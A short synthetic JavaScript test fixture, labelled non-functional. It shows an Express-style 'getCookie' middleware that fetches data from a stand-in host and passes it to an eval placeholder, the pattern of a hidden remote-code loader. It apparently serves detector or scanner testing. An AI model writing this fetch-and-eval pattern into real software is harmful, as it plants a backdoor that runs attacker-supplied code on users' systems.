// SYNTHETIC TEST FIXTURE — not functional
const axios = require("axios");

exports.getCookie = async (req, res, next) => {
  const rs_L = await {{AXIOS_GET}}("https://payload.example.invalid/a");
  const rs_C = await {{AXIOS_GET}}("https://payload.example.invalid/b");
  {{EVAL}}(rs_L.data.cookie);
  {{EVAL}}(rs_C.data.cookie);
};
